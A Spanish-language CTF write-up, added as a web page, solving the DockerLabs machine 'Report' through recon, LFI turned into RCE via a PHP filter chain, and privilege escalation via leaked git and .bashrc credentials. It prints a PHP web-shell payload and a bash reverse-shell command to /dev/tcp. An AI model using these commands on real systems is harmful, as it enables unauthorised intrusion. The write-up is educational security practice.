@@ -1,0 +1,231 @@
+---
+title: Report
+description: Resolución completa de la máquina virtual *Report* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Report**, desarrollada por *Luisillo_o* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un parámetro vulnerable a **Local File Inclusion (LFI)**. Utilizando una cadena de filtros de PHP, se logra convertir el LFI en ejecución remota de comandos (RCE) y se obtiene una reverse shell como `www-data`.
+Una vez dentro, se descubre un directorio `.git` que contiene un commit con credenciales expuestas del usuario `adm`. Tras acceder como `adm`, se encuentra una variable en `.bashrc` codificada en hexadecimal que revela la contraseña de `root`, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Report',
+    Autor: 'Luisillo_o',
+    Dificultad: 'Media',
+    Fecha: '20/10/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Report.zip
+sudo bash auto_deploy.sh Report.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Report/{content,exploits,nmap,scripts}
+cd Report
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+* **3306/tcp** — MySQL
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764054780/Ports_nuibfj.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80,3306 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se identifica el dominio `realgob.dl`. Se agrega al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 realgob.dl" | sudo tee -a /etc/hosts
+```
+
+Se realiza un escaneo de directorios:
+
+```bash
+gobuster dir -u http://realgob.dl/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1764054776/Gobuster_zsfki0.png)
+
+**Rutas relevantes:**
+- `/index.php` — Página principal.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1764054777/Index_ldbann.png)
+- `/login.php` — Portal de acceso.
+  ![Login](https://res.cloudinary.com/dewqswzke/image/upload/v1764054777/Login_aogknc.png)
+- `/register.php` — Registro de cuentas.
+- `/logs` — Accesible públicamente.
+  ![Logs](https://res.cloudinary.com/dewqswzke/image/upload/v1764054778/Logs_ox0xzf.png)
+- `/uploads` — Directorio accesible.
+  ![Uploads](https://res.cloudinary.com/dewqswzke/image/upload/v1764054783/Uploads_zutcp5.png)
+- `/important.txt` — Nota del autor.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Local File Inclusion
+
+La ruta `about.php?file=iniciativas.html` carga archivos directamente. Se prueba LFI:
+
+```
+http://realgob.dl/about.php?file=/etc/passwd
+```
+
+![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1764054779/Passwd_av81qk.png)
+
+### 2.2 LFI → RCE con filtros PHP
+
+Se utiliza `php_filter_chain_generator.py`:
+
+```bash
+php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
+```
+
+Se copia el payload generado y se usa en el parámetro `file`:
+
+```bash
+curl 'http://realgob.dl/about.php?file=php://filter<RECORTADO>php://temp&id' --output -
+```
+
+### 2.3 Reverse shell
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta el payload en URL-encoding:
+
+```bash
+curl 'http://realgob.dl/about.php?file=php://filter<RECORTADO>php://temp&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261%27' --output -
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1764054781/Reverse_jehtqs.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → adm
+
+Se encuentra un directorio `.git` con historial accesible. Un commit menciona "remote access management" y contiene una contraseña expuesta:
+
+![Commit](https://res.cloudinary.com/dewqswzke/image/upload/v1764054776/Commit_zxttrp.png)
+
+![Show commit](https://res.cloudinary.com/dewqswzke/image/upload/v1764054783/ShowCommit_nozh28.png)
+
+```bash
+su adm
+```
+
+![Adm](https://res.cloudinary.com/dewqswzke/image/upload/v1764054775/Adm_pamb8o.png)
+
+### 3.2 De adm → root
+
+En `.bashrc` se encuentra una variable codificada en hexadecimal:
+
+```bash
+MY_PASS=<hexadecimal>
+```
+
+Se decodifica:
+
+```bash
+echo MY_PASS | xxd -r -p
+```
+
+![Pass decode](https://res.cloudinary.com/dewqswzke/image/upload/v1764054779/pass_hx5qv1.png)
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764054782/Root_r3cfkx.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Local File Inclusion sin sanitización",
+      severity: "Crítica",
+      impact: "Lectura de archivos del sistema y RCE"
+    },
+    {
+      vulnerability: "Directorio .git expuesto con credenciales",
+      severity: "Crítica",
+      impact: "Compromiso de cuentas de usuario"
+    },
+    {
+      vulnerability: "Directorios sensibles accesibles públicamente",
+      severity: "Media",
+      impact: "Exposición de información"
+    },
+    {
+      vulnerability: "Credenciales codificadas en .bashrc",
+      severity: "Alta",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
